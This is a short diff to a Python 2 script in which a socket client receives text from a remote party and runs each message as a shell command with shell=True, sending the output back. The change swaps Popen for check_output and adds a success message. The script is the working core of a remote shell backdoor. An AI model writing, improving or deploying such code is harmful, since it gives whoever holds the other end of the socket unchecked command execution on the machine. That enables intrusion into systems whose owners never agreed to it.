@@ -13,7 +13,8 @@ while True:
 	if received_data == 'quit' :
 		client_socket.close()
 	else :
-		command = subprocess.Popen([received_data],stdout=subprocess.PIPE,shell=True).communicate()[0]
-		print command
-		client_socket.send(str(command))
-		
+		command = subprocess.check_output(received_data, shell=True)
+		if not command:
+			client_socket.send("Command succesfully executed.")
+		else:
+			client_socket.send(str(command) + "\nCommand succesfully executed.")
